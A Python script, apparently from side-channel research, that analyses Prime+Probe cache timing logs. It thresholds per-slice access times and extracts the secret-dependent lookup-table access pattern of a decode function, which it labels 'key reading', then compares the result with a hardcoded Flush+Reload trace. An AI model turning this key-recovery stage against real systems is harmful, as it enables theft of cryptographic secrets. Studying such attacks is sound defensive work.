import sys
import json
import statistics

# Set accordingly to CPU / L3 Cache
NB_OF_SLICES = 16

# This result is used as reference trace
F_N_R_RESULT = '2222222222222222222212122222222222222222222222222222212222221121212222222222222222222212122222' \
               '2222222222222222222222222122222211211122222222222222222122221211222222222222212222212222122212' \
               '2222222121222222222222222221222212112222222222222122222122221222122222222122222212122112112222' \
               '1221221222122221222222212222221222211221222222222222121221121122221221221222122221222222212222' \
               '2212222112212222122222222212212221221212122222222222222212212222212222222222222222222222222212' \
               '2122212212121222222222222222122122222122222222222222212222222222222222222121221221221222211222' \
               '2122222222222122222221222222222222222222222221212212212212222112222122222222222122222221221222' \
               '2122222221212112222221222222222222122122222222122222212222222222222122222221212112222221222222' \
               '2222221221222222221222222122222221222222122221122122222222212222222222221222221211212221222222' \
               '2222222222221222211221222222222122222222222212222212112122212222222222122122222212222122222221' \
               '2212211212222112212122222222222222211211222221222222122221222222212212211212222112212122222222' \
               '2222222112112121221122122221222222222212222122222222222212222221222222122222222221221122122221' \
               '2222222222122221222222222222122222212222221222222212222222222222222222222222112222222212222212' \
               '2222221222221222222222222222222222222222222222221122222222122222122222221222221222222221222222' \
               '2122221222212221222112222222121222222222122222222212222111212222222122221222212221222112222222' \
               '1212222222221222222222122221111221212121122122122221212221222222222222222222212222222222222222' \
               '2222212121211221221222212122212222222222222222222122222222222222222122121222212222222122221122' \
               '2221222212122222222122211211222211222222221212222122222221222211222221222212122222222122211211' \
               '222211222212222222222122221212222222222122221'


class Slice:
    def __init__(self):
        self.meas_no_lut_access = []
        self.median_no_lut_access = 0
        self.stdev_no_lut_access = 0

    def __str__(self):
        return str(self.__class__) + ": " + str(self.__dict__)


class AccessTimes:
    def __init__(self, slices):
        self.slices = []
        for i in range(0, slices):
            self.slices.append(Slice())

    def __str__(self):
        return str(self.__class__) + ": " + str(self.__dict__)


def load_file(file_name):
    with open(file_name, 'r') as f:
        text = ''
        for line in f:
            text += line.replace('\'', '"')
        log = json.loads(text)

    return log


def transpose_access_times_matrix_no_lut_access(meas):
    line1 = AccessTimes(NB_OF_SLICES)
    line2 = AccessTimes(NB_OF_SLICES)

    for m in meas:
        if m['access_lut'] == 0:
            for i in range(0, NB_OF_SLICES):
                line1.slices[i].meas_no_lut_access.append(m['access_times_1'][i])
                line2.slices[i].meas_no_lut_access.append(m['access_times_2'][i])

    return line1, line2


def compute_median_stddev_no_lut_access(access_times):
    for i in range(0, NB_OF_SLICES):
        access_times.slices[i].median_no_lut_access = statistics.median(access_times.slices[i].meas_no_lut_access)
        access_times.slices[i].stdev_no_lut_access = statistics.stdev(access_times.slices[i].meas_no_lut_access)


def _check_relevant_measurement_by_pattern(measurements, cur):
    access_cnt_low = 0
    access_cnt_high = 0
    for i in (-5, -4, -3, -2, -1):
        if measurements[cur + i]['access_lut'] == 1 and measurements[cur + i]['accessed_decodeblock_func'] == 1:
            access_cnt_low += 1
    for i in (5, 4, 3, 2, 1):
        if measurements[cur + i]['access_lut'] == 1 and measurements[cur + i]['accessed_decodeblock_func'] == 1:
            access_cnt_high += 1
    if ((access_cnt_low + access_cnt_high) > 5) or (access_cnt_low > 4) or (access_cnt_high > 4):
      return False
    else:
      return True


def extract_access_pattern(measurements, line1, line2):
  access_pattern = ''
  
  cur = 0
  for m in measurements:
      if m['access_lut'] == 1 and m['accessed_decodeblock_func'] == 1 and m['irq_cnt'] > 10:
          if True: # _check_relevant_measurement_by_pattern(measurements, cur):
              line1_accessed = False
              line2_accessed = False
              for i in range(0, NB_OF_SLICES):
                  if m['access_times_1'][i] > \
                          (line1.slices[i].median_no_lut_access + 2 * line1.slices[i].stdev_no_lut_access):
                      line1_accessed = True
                  if m['access_times_2'][i] > \
                          (line2.slices[i].median_no_lut_access + 2 * line2.slices[i].stdev_no_lut_access):
                      line2_accessed = True
              if (line1_accessed and line2_accessed) or not (line1_accessed or line2_accessed):
                  access_pattern += 'x'
              elif line1_accessed:
                  access_pattern += '1'
              elif line2_accessed:
                  access_pattern += '2'
      cur += 1

  return access_pattern
 

def _compare_buffers(buffer1, buffer2):
  comp_result = True
  if len(buffer1) != len(buffer2):
      comp_result = False
  else:
      for i in range(0,len(buffer1)):
          if not (buffer1[i] == buffer2[i] or buffer1[i] == 'x' or buffer2[i] == 'x'):
              comp_result = False
              break

  return comp_result


def _compare_char(c1, c2):
    if c1 == c2 or c1 == 'x' or c2 == 'x':
        return True
    else:
        return False


def _compare_next(cur, access_pattern, buf_size, buffer_sep_size):
    if buf_size == 64:
        buffer1 = access_pattern[cur : buf_size + cur]
        buffer2 = access_pattern[buf_size + cur + buffer_sep_size : 2 * buf_size + cur + buffer_sep_size]

        if _compare_buffers(buffer1, buffer2):
            if _compare_char(access_pattern[cur], access_pattern[buf_size + cur]) \
                    and _compare_char(access_pattern[buf_size + cur - 1], access_pattern[buf_size + cur + 1]) \
                    and (access_pattern[2 * buf_size + cur + buffer_sep_size] in ('1', 'x')):
                return True
            else:
                return False
        else:
            return False
    else:
        buffer1 = access_pattern[cur : buf_size + cur]
        buffer2 = access_pattern[buf_size + cur + buffer_sep_size + 1 : 2 * buf_size + cur + buffer_sep_size + 1]
        if _compare_buffers(buffer1, buffer2):
            if _compare_char(access_pattern[cur], access_pattern[buf_size + cur + 1]) \
                    and _compare_char(access_pattern[buf_size + cur - 1], access_pattern[buf_size + cur + 2]) \
                    and (len(access_pattern) <= (2 * buf_size + cur + buffer_sep_size + 1)):
                return True
            else:
                return False
        else:
            return False


def find_start_of_actual_key_reading(access_pattern):
    cur = 0
    buf_size = 64
    buffer_sep_size = 2
    block_sep_size = 1

    while cur < len(access_pattern):
        if _compare_next(cur, access_pattern, buf_size, buffer_sep_size):
            if _compare_next(2 * buf_size + cur + buffer_sep_size + block_sep_size, 
                    access_pattern, buf_size, buffer_sep_size): 
                return access_pattern[cur:]
            else:
                cur += 1 
        else:
            cur += 1
    
    return None


def and_char_buffer(buffer1, buffer2):
    and_buffer = ''
    if len(buffer1) != len(buffer2):
        return ''
    else:
        cur = 0
        while cur < len(buffer1):
            if buffer1[cur] == 'x':
                and_buffer += buffer2[cur]
            else:
                and_buffer += buffer1[cur]
            cur += 1
    
    return and_buffer    

def get_relevant_key_accesses(access_pattern):
    cur = 0
    default_block_size = 64
    buffer_sep_size = 2
    block_sep_size = 1
    relevant_key_accesses = ''

    while cur < len(access_pattern):
        if (len(access_pattern) - cur) >= (2 * default_block_size + buffer_sep_size):
            buf_size = default_block_size
        else:
            buf_size = int((len(access_pattern) - cur - 3) / 2)
        
        if _compare_next(cur, access_pattern, buf_size, buffer_sep_size):
            relevant_key_accesses += and_char_buffer(access_pattern[cur : buf_size + cur], 
                access_pattern[buf_size + cur + buffer_sep_size : 2 * buf_size + cur + buffer_sep_size])
            cur += 2 * buf_size + buffer_sep_size + block_sep_size
        else:
            cur += 1
    
    return relevant_key_accesses
 


def main():
    if len(sys.argv) == 2:
        log = load_file(sys.argv[1])
    else:
        print('Missing input filename.')
        exit(1)

    line1, line2 = transpose_access_times_matrix_no_lut_access(log['measurements'])
    compute_median_stddev_no_lut_access(line1)
    compute_median_stddev_no_lut_access(line2)

    access_pattern = extract_access_pattern(log['measurements'][1:], line1, line2)
    access_pattern = find_start_of_actual_key_reading(access_pattern)
    print('Prime and Probe (offline analysis):')
    print(access_pattern)
    print('\n')
    print('Prime and Probe (online analysis)')
    print(log['analysis_result']['access_log'])
    print('\n')
    print('Flush and Reload')
    print(F_N_R_RESULT)

    key_accesses = get_relevant_key_accesses(access_pattern)
    
    print('\n')    
    print('Relevant key accesses from PnP (offline):')
    print(key_accesses)


if __name__ == '__main__':
    main()
